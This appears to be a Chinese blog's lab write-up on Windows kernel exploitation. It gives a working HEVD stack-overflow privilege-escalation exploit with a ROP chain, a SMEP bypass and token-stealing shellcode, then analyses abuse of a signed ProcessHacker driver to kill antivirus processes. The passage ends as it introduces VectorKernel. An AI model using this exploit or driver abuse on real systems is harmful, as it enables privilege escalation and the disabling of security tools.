\u7f13\u51b2\u533a\u6ea2\u51fa \u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u4ea7\u751f\u95ee\u9898\u7684\u51fd\u6570\u662f TriggerBufferOverflowStack \u3002 \u627e\u5230\u51fd\u6570\u5730\u5740 \u5728\u51fd\u6570\u8fd4\u56de\u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884cPoc\u89c2\u5bdf\u5bc4\u5b58\u5668\u7684\u503c \u6253\u84dd\u5c4fPoc #include <iostream> #include <string> #include <Windows.h> #define DEVICE_NAME \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\" //\u9a71\u52a8\u5bf9\u8c61\u8def\u5f84 //#define DEVICE_NAME \"\\\\Device\\\\HackSysExtremeVulnerableDriver\" #define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // \u4e00\u4e2a\u5b8f\uff0c\u4ece\u7f16\u53f7\u83b7\u53d6IOCTL #define STACK_OVERFLOW_IOCTL_NUMBER IOCTL(0x800) //\u4ea7\u751f\u95ee\u9898\u7684\u9a71\u52a8IOCTL\u7f16\u53f70x800 using namespace std; HANDLE get_handle() { HANDLE h = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); //CreateFileA \u6253\u5f00\u9a71\u52a8\u5bf9\u8c61\u8fd4\u56de\u53e5\u67c4 if (h == INVALID_HANDLE_VALUE) { printf(\"Failed to get handle =(\\n\"); return NULL; } else { printf(\"Success to get handle,0x%x\",h); } return h; } //get_handle\u51fd\u6570\u4ece\u9a71\u52a8\u5bf9\u8c61\u8def\u5f84\u4e2d\u83b7\u53d6\u53e5\u67c4 void do_buffer_overflow(HANDLE h) { SIZE_T in_buffer_size = 0x1000; PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size); //\u5206\u914d\u5806\u7a7a\u95f4 memset((char*)in_buffer, 'A', in_buffer_size); //\u5f80\u5806\u4e2d\u5199\u51650x1000\u4e2aA printf(\"Sending buffer.\\n\"); bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL); //\u4f7f\u7528DeviceIoControl()\u5f80\u6307\u5b9a\u7f16\u53f7\u7684\u9a71\u52a8\u5bf9\u8c61\u53d1\u9001\u6570\u636e if (!result) { printf(\"IOCTL Failed: %X\\n\", GetLastError()); } HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer); } int main() { HANDLE h = get_handle(); do_buffer_overflow(h); //std::cout << \"Hello World!\\n\"; } \u89c2\u5bdf\u8fd0\u884cPoc\u540e\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u591a\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u88ab\u8986\u76d6\uff0crsp\u5904\u7684\u4ee3\u7801\u88ab\u8986\u76d6 \u84dd\u5c4f \u6ca1\u6709\u6ea2\u51fa\u5230rsp\uff0c\u800c\u662f\u6ea2\u51fa\u5230rsp\u7684\u5730\u5740 \u5c1d\u8bd5\u627e\u51fa\u6ea2\u51fa\u4f4d\u7f6e \u67e5\u770brsp\u5730\u5740\u7684\u503c\u5df2\u7ecf\u88ab\u8986\u76d6 1: kd> d fffff88b53f177b8 fffff88b`53f177b8 30 43 72 31 43 72 32 43-72 33 43 72 34 43 72 35 0Cr1Cr2Cr3Cr4Cr5 fffff88b`53f177c8 43 72 36 43 72 37 43 72-38 43 72 39 00 00 00 00 Cr6Cr7Cr8Cr9.... fffff88b`53f177d8 18 00 00 00 00 00 00 00-01 00 00 00 00 00 00 00 ................ fffff88b`53f177e8 53 52 42 85 04 f8 ff ff-10 15 5b 6c 85 a4 ff 7f SRB.......[l.... fffff88b`53f177f8 ff ff ff ff 00 00 00 00-d0 82 42 85 04 f8 ff ff ..........B..... fffff88b`53f17808 03 20 22 00 00 00 00 00-c0 70 5b 6c 85 a4 ff ff . \"......p[l.... fffff88b`53f17818 79 8f 03 80 04 f8 ff ff-c0 42 52 6b 85 a4 ff ff y........BRk.... fffff88b`53f17828 02 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ \u250c\u2500\u2500(root\ud83d\udc80kali)-[~] \u2514\u2500# msf-pattern_offset -q 31724330 [*] Exact match at offset 2072 \u7531\u6b64\u53ef\u4ee5\u77e5\u9053\u6ea2\u51fa\u70b9\u57282072\u4e2a\u5b57\u7b26\u540e\u3002 SMEP\u7684\u5e72\u6270 Supervisor Mode Execition Prevention\uff08SMEP\uff09\u662f\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u7684\u4e00\u79cd\u5b89\u5168\u673a\u5236\uff0c\u4e0d\u5141\u8bb8\u5728\u67d0\u4e9b\u5185\u5b58\u7a7a\u95f4\u6267\u884c\u4ee3\u7801\uff0c\u5426\u5219\u4f1a\u76f4\u63a5\u84dd\u5c4f\u3002 \u5982\u4f55\u7ed5\u8fc7 - ROP\u7ed5\u8fc7 - KPTI\u7ed5\u8fc7 \u5982\u679c\u7cfb\u7edf\u542f\u7528\u4e86 KPTI\uff0c\u5219\u6076\u610f\u4ee3\u7801\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u5185\u6838\u5185\u5b58\u3002\u4f46\u662f\uff0c\u6076\u610f\u4ee3\u7801\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u6216\u5176\u4ed6\u653b\u51fb\u65b9\u5f0f\u4fee\u6539\u5185\u6838\u5185\u5b58\u6620\u5c04\u8868\u3002\u5982\u679c\u6076\u610f\u4ee3\u7801\u6210\u529f\u4fee\u6539\u4e86\u5185\u6838\u5185\u5b58\u6620\u5c04\u8868\uff0c\u5219\u6076\u610f\u4ee3\u7801\u4ecd\u7136\u53ef\u4ee5\u8bbf\u95ee\u5185\u6838\u5185\u5b58 \u6d41\u7a0b - \u4f7f\u7528 ExAllocatePoolWithTag() \u5206\u914d\u53ef\u6267\u884c\u7684\u4e0d\u53ef\u5206\u9875\u5185\u5b58\u6c60 - \u4f7f\u7528 RtlCopyMemory \u4ece\u7528\u6237\u6a21\u5f0f\u590d\u5236shellcode \u9700\u8981\u4ecentoskrnl\u83b7\u53d6\u51fd\u6570\u5730\u5740\u624d\u53ef\u4f7f\u7528\u4e24\u4e2a\u51fd\u6570 - \u91cd\u5b9a\u5411\u6267\u884c\u6d41 \u4e3a\u4e86\u4ece\u968f\u673a\u5730\u5740\u7a7a\u95f4\u4e2d\u83b7\u53d6\u51fd\u6570\u7684\u5730\u5740\uff0c\u9700\u8981\u901a\u8fc7Psapi\u6765\u679a\u4e3e\u6307\u5b9a\u9a71\u52a8\u7684\u955c\u50cf\u57fa\u5740 #include <Windows.h> #include <Psapi.h> ... unsigned long long get_kernel_base_addr() { LPVOID drivers[1024]; DWORD cbNeeded; EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded); return (unsigned long long)drivers[0]; } \u901a\u8fc7\u51fd\u6570\u540d\u79f0\u83b7\u53d6\u8be6\u7ec6\u5730\u5740 PVOID get_kernel_symbol_addr(const char *symbol) { PVOID kernelBaseAddr; HMODULE userKernelHandle; PCHAR functionAddress; unsigned long long offset; kernelBaseAddr = (PVOID)get_kernel_base_addr(); // \u901a\u8fc7get_kernel_base_addr\u83b7\u53d6\u955c\u50cf\u57fa\u5740 userKernelHandle = LoadLibraryA(\"C:\\\\Windows\\\\System32\\\\ntoskrnl.exe\"); // \u83b7\u53d6ntoskrnl\u53e5\u67c4 if (userKernelHandle == INVALID_HANDLE_VALUE) { return NULL; } functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol); // \u6839\u636e\u7b26\u53f7\u540d\u79f0\uff08\u51fd\u6570\u540d\u79f0\uff09\u83b7\u53d6\u5730\u5740 if (functionAddress == NULL) { return NULL; } offset = functionAddress - ((PCHAR)userKernelHandle); // \u51fd\u6570\u5730\u5740-ntoskrnl\u53e5\u67c4\u521d\u59cb\u5730\u5740 = \u51fd\u6570\u504f\u79fb\u91cf return (PVOID)(((PCHAR)kernelBaseAddr) + offset); // \u8fd4\u56de\u5f53\u524d\u5185\u5b58\u4e2d\u7684\u51fd\u6570\u5b9e\u9645\u5730\u5740\uff0c\u5f53\u524d\u955c\u50cf\u57fa\u5740+\u51fd\u6570\u504f\u79fb\u91cf } exp\u4ee3\u7801\uff0c\u63d0\u6743 #include <iostream> #include <string> #include <Windows.h> #include <Psapi.h> // Name of the device #define DEVICE_NAME \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\" #define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) //\u5b9a\u4e49ROP\u6307\u4ee4 unsigned long long g_add_rsp_20h_ret = 0xa155de; unsigned long long g_pop_rdi_pop_r14_pop_rbx_ret = 0x20a518; unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x38cf53; unsigned long long g_pop_rdx_ret = 0x416748; unsigned long long g_push_rax_pop_rbx_ret = 0x20a263; unsigned long long g_push_rax_pop_r13_ret = 0x5af724; unsigned long long g_xchg_r8_r13_ret = 0x2c0da6; unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x93ac7a; unsigned long long g_pop_r8_ret = 0x2017f1; unsigned long long g_jmp_rbx = 0x408aa2; unsigned long long kernel_ExAllocatePoolWithTag; unsigned long long kernel_sysret = 0xa13dc0; unsigned long long kernel_memcpy; DWORD pid; typedef struct sSepTokenPrivileges { UINT8 present; UINT8 enabled; UINT8 enabled_by_default; } SEP_TOKEN_PRIVILEGES; typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID*); _PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId; typedef PVOID(*_PsReferencePrimaryToken)(PVOID); _PsReferencePrimaryToken kernel_PsReferencePrimaryToken; // \u679a\u4e3e\u9a71\u52a8\u955c\u50cf\u57fa\u5740 unsigned long long get_kernel_base_addr() { LPVOID drivers[1024]; DWORD cbNeeded; EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded); return (unsigned long long)drivers[0]; } // \u6253\u5f00\u9a71\u52a8\u5bf9\u8c61\uff0c\u83b7\u53d6\u9a71\u52a8\u53e5\u67c4 HANDLE get_handle() { HANDLE h = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (h == INVALID_HANDLE_VALUE) { printf(\"Failed to get handle =(\\n\"); return NULL; } return h; } // \u590d\u5236ROP payload void add_to_payload(char* in_buffer, SIZE_T* offset, unsigned long long* data, SIZE_T size) { memcpy(in_buffer + *offset, data, size); printf(\"Wrote %lx to offset %u\\n\", *data, *offset); *offset += size; } //\u83b7\u53d6\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740 PVOID get_kernel_symbol_addr(const char* symbol) { PVOID kernelBaseAddr; HMODULE userKernelHandle; PCHAR functionAddress; unsigned long long offset; kernelBaseAddr = (PVOID)get_kernel_base_addr(); // Loads kernel base address userKernelHandle = LoadLibraryA(\"C:\\\\Windows\\\\System32\\\\ntoskrnl.exe\"); // Gets kernel binary if (userKernelHandle == INVALID_HANDLE_VALUE) { return NULL; } functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol); // Finds given symbol if (functionAddress == NULL) { // Could not find symbol return NULL; } offset = functionAddress - ((PCHAR)userKernelHandle); // Subtracts the loaded binary's base address from the found address. This way, we will find the offset of the symbol for base address 0. return (PVOID)(((PCHAR)kernelBaseAddr) + offset); // Adds the offset to the leaked base address. } void adjust_offsets() { unsigned long long kernel_base_addr = get_kernel_base_addr(); g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr; g_pop_rdi_pop_r14_pop_rbx_ret += kernel_base_addr; g_add_rsp_20h_ret += kernel_base_addr; g_pop_rdx_ret += kernel_base_addr; g_push_rax_pop_rbx_ret += kernel_base_addr; g_push_rax_pop_r13_ret += kernel_base_addr; g_xchg_r8_r13_ret += kernel_base_addr; g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr; g_pop_r8_ret += kernel_base_addr; g_jmp_rbx += kernel_base_addr; kernel_sysret += kernel_base_addr; kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr(\"ExAllocatePoolWithTag\"); kernel_memcpy = (unsigned long long) get_kernel_symbol_addr(\"memcpy\"); kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)get_kernel_symbol_addr(\"PsLookupProcessByProcessId\"); kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken)get_kernel_symbol_addr(\"PsReferencePrimaryToken\"); printf(\"Primary token: %xu \\n\", (ULONGLONG)kernel_PsReferencePrimaryToken - kernel_base_addr); printf(\"PsReferencePrimaryToken base addr: %xu\\n\", (ULONGLONG)kernel_PsReferencePrimaryToken - (ULONGLONG)kernel_base_addr); } DWORD spawnCmd() { STARTUPINFO si; PROCESS_INFORMATION pi; wchar_t cmd[] = L\"C:\\\\Windows\\\\System32\\\\cmd.exe\"; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&pi, sizeof(pi)); // Start the child process. if (!CreateProcessW(NULL, // No module name (use command line) cmd, // Command line NULL, // Process handle not inheritable NULL, // Thread handle not inheritable FALSE, // Set handle inheritance to FALSE CREATE_NEW_CONSOLE, // No creation flags NULL, // Use parent's environment block NULL, // Use parent's starting directory &si, // Pointer to STARTUPINFO structure &pi) // Pointer to PROCESS_INFORMATION structure ) { printf(\"CreateProcess failed (%d).\\n\", GetLastError()); return -1; } return pi.dwProcessId; } //\u6267\u884cROP\u4ee3\u7801\u540e\u8fd4\u56de\u7528\u6237\u7a7a\u95f4\u7684shellcode\uff0c\u5426\u5219\u7cfb\u7edf\u4f1a\u84dd\u5c4f char* generate_shellcode() { char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e + 11); memcpy(shellcode, \"\\x48\\xc7\\xc1\\x78\\x56\\x34\\x12\\x48\\x83\\xec\\x08\\x48\\x89\\xe2\\x48\\xbb\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xff\\xd3\\x48\\x8b\\x0c\\x24\\x48\\xbb\\x10\\x32\\x34\\x12\\xff\\xff\\xff\\xff\\xff\\xd3\\x48\\x83\\xc0\\x40\\x48\\xb9\\xfc\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x48\\x89\\x08\\x48\\x83\\xc0\\x08\\x48\\x89\\x08\\x48\\x83\\xc0\\x08\\x48\\x89\\x08\\x48\\x83\\xc4\\x08\\x48\\xBB\\xC0\\x0D\\x02\\x1B\\x05\\xF8\\xFF\\xFF\\xFF\\xE3\", 0x4e + 11); memcpy(shellcode + 3, &pid, 4); memcpy(shellcode + 16, &kernel_PsLookupProcessByProcessId, 8); memcpy(shellcode + 32, &kernel_PsReferencePrimaryToken, 8); memcpy(shellcode + 0x4e + 1, &kernel_sysret, 8); return shellcode; } //Does everything void do_buffer_overflow(HANDLE h) { SIZE_T in_buffer_size = 2072 + 8 * 15 + 0x20; PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size); memset((char*)in_buffer, 'A', in_buffer_size); SIZE_T offset = 2072; pid = spawnCmd(); adjust_offsets(); char* shellcode = generate_shellcode(); unsigned long long size_of_copy = 0x4e + 11; add_to_payload((char*)in_buffer, &offset, &g_xor_ecx_ecx_mov_rax_rcx_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8); add_to_payload((char*)in_buffer, &offset, &size_of_copy, 8); add_to_payload((char*)in_buffer, &offset, &kernel_ExAllocatePoolWithTag, 8); add_to_payload((char*)in_buffer, &offset, &g_add_rsp_20h_ret, 8); offset += 0x20; add_to_payload((char*)in_buffer, &offset, &g_push_rax_pop_rbx_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_push_rax_pop_r13_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_xchg_r8_r13_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_mov_rcx_r8_mov_rax_rcx_ret, 8); add_to_payload((char*)in_buffer, &offset, &g_pop_rdx_ret, 8); add_to_payload((char*)in_buffer, &offset, (unsigned long long*)(&shellcode), 8); add_to_payload((char*)in_buffer, &offset, &g_pop_r8_ret, 8); add_to_payload((char*)in_buffer, &offset, &size_of_copy, 8); add_to_payload((char*)in_buffer, &offset, &kernel_memcpy, 8); add_to_payload((char*)in_buffer, &offset, &g_jmp_rbx, 8); system(\"pause\"); printf(\"Sending buffer.\\n\"); bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL); if (!result) { printf(\"IOCTL Failed: %X\\n\", GetLastError()); } //Frees allocated memory HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer); } int main(int argc, char** argv) { do_buffer_overflow(get_handle()); system(\"pause\"); } ProcessHacker\u9a71\u52a8\u6f0f\u6d1e\u5206\u6790 \u4ecb\u7ecd ProcessHacker\u76842.8.0.0\u7248\u672c\u7684\u9a71\u52a8\u7a0b\u5e8f kprocesshacker.sys \u5b58\u5728\u6f0f\u6d1e\uff0c\u8be5\u9a71\u52a8\u662f\u6570\u5b57\u7b7e\u540d\u7684\uff0c\u5229\u7528\u9a71\u52a8\u6f0f\u6d1e\u53ef\u4ee5\u5728R0\u4e0b\u7ed3\u675f\u8fdb\u7a0b\u3001\u6682\u505c\u8fdb\u7a0b\uff0c\u4e14\u53ef\u7ed3\u675f\u81ea\u6211\u9632\u62a4\u4e0d\u4e25\u683c\u7684\u6740\u6bd2\u8f6f\u4ef6\u3002 \u76ee\u7684 \u4ee5\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u5165\u624b\uff0c\u5206\u6790\u6f0f\u6d1e\u70b9\u4ee5\u589e\u5f3a\u77e5\u8bc6\u7406\u89e3\u548c\u8c03\u8bd5\u719f\u7ec3\u5ea6 \u5bfb\u627e\u6f0f\u6d1e\u70b9 \u5148\u68c0\u9a8c\u4e00\u4e0bProcessHacker\u80fd\u5426\u6740\u706b\u7ed2 \u706b\u7ed2\u76f4\u63a5\u88ab\u6740\u4e86\u4e14\u6ca1\u6709\u91cd\u65b0\u542f\u52a8 \u65e2\u7136\u662f\u7ed3\u675f\u8fdb\u7a0b\uff0c\u53ef\u80fd\u7528\u5230\u4e86 ZwTerminateProcess \u3002 \u4e5f\u6709\u5176\u4ed6\u4f7f\u7528\u975e\u516c\u5f00\u5185\u6838\u51fd\u6570\u7684\u65b9\u6cd5\u6765\u7ed3\u675f\u8fdb\u7a0b\uff0c\u4f46\u4e00\u822c\u6b63\u5e38\u7684\u5de5\u5177\u5e94\u8be5\u4e0d\u4f1a\u90a3\u6837\u505a\u3002 \u4e3a\u4e86\u8bc1\u5b9e\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u8c03\u8bd5\u4e00\u4e0b\u7ed3\u675f\u8fdb\u7a0b\u64cd\u4f5c\u662f\u5426\u771f\u7684\u8c03\u7528\u4e86 ZwTerminateProcess . \u5728 kprocesshacker \u548c ntdll!ZwTerminateProcess \u5904\u4e0b\u65ad\u70b9\uff0c\u5f53\u4f7f\u7528ProcessHacker\u7ed3\u675f\u8fdb\u7a0b\u65f6\uff0c\u6210\u529f\u65ad\u5728 ZwTerminateProcess \u51fd\u6570\u8c03\u7528\u5904 \u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u9700\u8981\u9759\u6001\u5206\u6790\u51fa\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u627e\u51fa\u9a71\u52a8\u4e2d\u51fd\u6570\u504f\u79fb\u91cf. \u7531\u4e8e\u6211\u6ca1\u6709\u627e\u52302.8.0.0\u7248\u672c\u9a71\u52a8\u7684ProcessHacker\u7684\u6587\u4ef6\uff0c\u7528\u7684\u662f\u5176\u4ed6\u7248\u672c\u8fdb\u884c\u8c03\u8bd5\u3002 \u5f53\u6211\u5c1d\u8bd5\u7528\u5176\u4ed6\u7248\u672c\u7684exe\u52a0\u8f7d2.8.0.0\u7684sys\u6587\u4ef6\u65f6\uff0c\u867d\u7136exe\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\uff0c\u4f46\u662f\u7ecf\u8fc7\u8c03\u8bd5\u540e\u53d1\u73b0sys\u6587\u4ef6\u4f3c\u4e4e\u6ca1\u6709\u88ab\u6b63\u786e\u8c03\u7528\uff0c\u56e0\u4e3aProcessHacker\u7528\u7684\u81ea\u5df1\u800c\u4e0d\u662f\u9a71\u52a8\u6765\u8c03\u7528ZwTerminateProcess\u3002\u770b\u6765exe\u548csys\u662f\u914d\u5bf9\u7684 \u4e0b\u65ad\u70b9 bp kprocesshacker+0x68f1 \u6765\u627e\u4e00\u4e0b kprocesshacker.sys \u7ed3\u675f\u8fdb\u7a0b\u7684\u5185\u6838\u7ea7\u522b\u51fd\u6570 ZwTerminateProcess \u641c\u7d22 ZwTerminateProcess \u53ef\u4ee5\u770b\u5230\u88ab\u51fd\u6570 FUN_00017e78 \u8c03\u7528\u4e86\uff0c\u90a3\u4e48 FUN_00017e78 \u662f\u4e0d\u662f\u9020\u6210\u6f0f\u6d1e\u7684\u4e3b\u8981\u539f\u56e0\u5462 \u5728\u770b FUN_00017e78 \u7684\u53cd\u6c47\u7f16\u4e4b\u524d\u5148\u770b\u770b ZwTerminateProcess \u51fd\u6570\u539f\u578b ZwTerminateProcess \u63a5\u53d72\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u8fdb\u7a0b\u7684\u53e5\u67c4\uff0c\u7b2c\u4e8c\u4e2a\u662f\u8fdb\u7a0b\u7684\u9000\u51fa\u72b6\u6001\u3002\u7b80\u5355\u7c97\u66b4 NTSTATUS ZwTerminateProcess( _In_ HANDLE ProcessHandle, _In_ NTSTATUS ExitStatus ); \u5982\u679c\u662f\u7ed3\u675f\u8fdb\u7a0b\u53ef\u4ee5\u88ab\u63a7\u5236\uff0c\u90a3\u60f3\u5fc5\u7b2c\u4e00\u4e2a\u53c2\u6570 ProcessHandle \u80af\u5b9a\u53ef\u4ee5\u88ab\u63a7\u5236\u3002 FUN_00017e78 \u51fd\u6570\u53cd\u6c47\u7f16\u5982\u4e0b ulonglong FUN_00017e78(undefined8 param_1,undefined4 param_2,undefined param_3) { longlong lVar1; uint uVar2; ulonglong uVar3; longlong lVar4; code *pcVar5; longlong local_res20; ulonglong uVar6; undefined8 local_18 [2]; uVar6 = 0; uVar3 = ObReferenceObjectByHandle (param_1,0,*(undefined8 *)PsProcessType_exref,param_3,&local_res20,0); if ((int)uVar3 < 0) { return uVar3; } lVar4 = IoGetCurrentProcess(); lVar1 = local_res20; if (local_res20 == lVar4) { uVar3 = 0xc00000db; } else { if ((DAT_00014334 == 0) && (pcVar5 = (code *)FUN_00011bac(&DAT_000141c0), pcVar5 != (code *)0x0) ) { uVar2 = (*pcVar5)(lVar1,param_2); uVar3 = (ulonglong)uVar2; if (uVar2 != 0xc00000bb) goto LAB_00017f58; } uVar2 = ObOpenObjectByPointer (local_res20,0x200,0,1,*(undefined8 *)PsProcessType_exref, uVar6 & 0xffffffffffffff00,local_18); uVar3 = (ulonglong)uVar2; if (-1 < (int)uVar2) { uVar2 = ZwTerminateProcess(local_18[0],param_2); uVar3 = (ulonglong)uVar2; ZwClose(local_18[0]); } } LAB_00017f58: ObfDereferenceObject(local_res20); return uVar3; } \u4ee3\u7801\u8bfb\u5f97\u5934\u660f\u8111\u80c0\uff1f\u6ca1\u5173\u7cfb\uff0c\u8fd9\u79cd\u4e8b\u60c5\u53ef\u4ee5\u4ea4\u7ed9GPT\u3002 \u7b80\u800c\u8a00\u4e4b\uff0c FUN_00017e78 \u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u5165\u4e86 ObReferenceObjectByHandle \uff0c\u8be5\u51fd\u6570\u662f\u6253\u5f00\u8fdb\u7a0b\u5bf9\u8c61\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u53e5\u67c4\u3002 ObReferenceObjectByHandle \u5c06\u8fd4\u56de\u7684\u53e5\u67c4\u5b58\u5230\u4e86 local_18 \u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002\u800c ZwTerminateProcess \u63a5\u53d7 local_18 \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a\u7ed3\u675f\u7684\u8fdb\u7a0b\u53e5\u67c4\u4f20\u5165\u3002 \u6240\u4ee5\u53ea\u9700\u8981\u63a7\u5236 FUN_00017e78 \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u53ef\u4ee5\u5229\u7528\u9a71\u52a8\u76f4\u63a5\u7ed3\u675f\u8fdb\u7a0b\u3002 \u77e5\u9053\u4e86\u6f0f\u6d1e\u539f\u56e0\uff0c\u518d\u6765\u770b\u770b\u5229\u7528\u5de5\u5177\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u3002 \u5229\u7528\u5de5\u5177\u5206\u6790 https://github.com/MrEmpy/Reaper \u5de5\u5177\u51e0\u4e2a\u51fd\u6570\u5982\u56fe \u4e3b\u8981\u529f\u80fd\u51fd\u6570\u5305\u62ec\u52a0\u8f7d\u9a71\u52a8\u3001\u5378\u8f7d\u9a71\u52a8\u3001\u6682\u505c\u8fdb\u7a0b\u3001\u7ed3\u675f\u8fdb\u7a0b\u3002 \u6765\u8bd5\u4e00\u4e0b\u5de5\u5177\u7684\u6548\u679c\u5427\uff01 \u5982\u4e0b\u56fe\u6740\u4e86\u706b\u7ed22\u4e2a\u8fdb\u7a0b\uff0c\u706b\u7ed2\u5df2\u7ecf\u88ab\u6740\u6ca1\u4e86\u3002 \u8fd9\u4e2a\u5de5\u5177\u6bcf\u6b21\u7ed3\u675f\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u505c\u6b62\u9a71\u52a8\uff0c\u706b\u7ed2\u5b58\u5728\u591a\u4e2a\u8fdb\u7a0b\uff0c\u82e5\u8981\u5b9e\u6218\u9700\u8981\u6539\u4e00\u4e0b\u7a0b\u5e8f\u3002 \u603b\u800c\u8a00\u4e4b\uff0c\u8fd9\u662f\u53ef\u4ee5\u6b63\u786e\u5730\u6740\u6b7b\u706b\u7ed2\u7684\u3002 \u6765\u7528windbg\u8ddf\u4e00\u4e0b\u3002 \u9996\u5148\u57282.8.0.0\u7248\u672c\u7684sys\u627e\u5230\u51fd\u6570\u504f\u79fb\u91cf \u4e0b\u65ad\u70b9 \u6267\u884creaper\u6210\u529f\u5728\u51fd\u6570\u5904\u65ad\u4e0b,rcx\u662f\u8fdb\u7a0b\u53e5\u67c4\uff0crdx\u662f\u9000\u51fa\u72b6\u6001 \u8fd9\u4e2a\u5de5\u5177\u9996\u5148\u4f7f\u7528 DeployDriver \u52a0\u8f7dsys\u9a71\u52a8\u5e76\u8bbe\u7f6e\u5bf9\u8c61\u8def\u5f84 \\\\.\\KProcessHacker2 , \u7136\u540e\u901a\u8fc7\u6307\u5b9a\u7684PID\u4f7f\u7528 OpenProcess \u83b7\u53d6\u8981\u64cd\u4f5c\u7684\u8fdb\u7a0b\u53e5\u67c4\u3002 \u800c\u6700\u6838\u5fc3\u7684\u5728\u4e8e\u8fd9\u4e24\u884c\u76f8\u5e94\u529f\u80fd\u7684 IOCTL \u7f16\u53f7\uff0c\u8fd9\u4e5f\u662f\u6f0f\u6d1e\u5b58\u5728\u7684\u70b9 #define IOCTL_CODE_KILLPROCESS 0x999920df #define IOCTL_CODE_SUSPENDPROC 0x999920d7 \u63a5\u7740\u901a\u8fc7 DeviceIoControl \u51fd\u6570\u64cd\u4f5c\u9a71\u52a8\u5bf9\u8c61\uff0c\u5f80\u76f8\u5e94\u7684 IOCTL \u53d1\u9001\u4e86 ioInput \u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5305\u542b\u8fdb\u7a0b\u53e5\u67c4\u548c\u9000\u51fa\u72b6\u6001\u3002\u4e5f\u6b63\u662f ZwTerminateProcess \u6240\u63a5\u6536\u7684\u53c2\u6570\u3002 \u6700\u540e\u5229\u7528\u9a71\u52a8\u7684\u529f\u80fd\uff0c\u6267\u884c\u4e86\u6211\u4eec\u60f3\u8981\u7684\u7ed3\u679c\u3002 \u5c3e\u58f0 \u5173\u4e8e\u6f0f\u6d1e\u70b9\uff0c\u4e5f\u5c31\u662f IOCTL \u7f16\u53f7\u4e3a\u4ec0\u4e48\u662f\u8fd9\u4e2a\uff0c\u8fd8\u9700\u8981\u8fdb\u4e00\u6b65\u7814\u7a76\u3002 VectorKernel\u5de5\u5177\u5b66\u4e60 \u4e92\u8054\u7f51\u51b2\u6d6a\u65f6\u53d1\u73b0\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u4f5c\u8005\u5199\u4e86\u542b\u591a\u4e2a\u81ea\u5b9a\u4e49\u529f\u80fd\u7684sys\u9a71\u52a8\uff0c\u5e76\u7528C#\u7a0b\u5e8f\u8c03\u7528\u9a71\u52a8\u3002 \u6765\u770b\u770b\u8fd9\u4e2a\u5de5\u5177\u3002 \u9879\u76ee\u5730\u5740 https://github.com/daem0nc0re/VectorKernel BlockNewProc 